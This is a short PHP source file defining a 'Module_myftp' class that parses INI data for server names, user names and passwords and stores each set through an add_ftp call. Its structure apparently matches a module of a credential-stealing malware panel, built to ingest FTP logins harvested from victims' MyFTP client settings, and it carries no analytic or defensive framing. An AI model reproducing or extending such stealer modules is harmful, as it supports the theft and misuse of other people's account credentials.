<?php
	class Module_myftp extends Module_
	{
		protected function ProcessMyFTP($Data)
		{
			$INI_ = parse_ini_string($Data, TRUE);
			if(!$INI_)
				return;

			foreach($INI_ as $Element)
			{
				$Host = Assign_($Element['server_name']);
				$User = Assign_($Element['user_name']);
				$Pass = Assign_($Element['user_password']);
				
				$this->add_ftp($Host, $User, $Pass);
			}
			
			$INI_ = NULL;
		}

		public function process_module($Data, $Version)
		{
			switch ($Version)
			{
			case 0:
				$this->ProcessMyFTP($Data);
				break;
			default:
				return FALSE;
			}

			return TRUE;
		}
	}

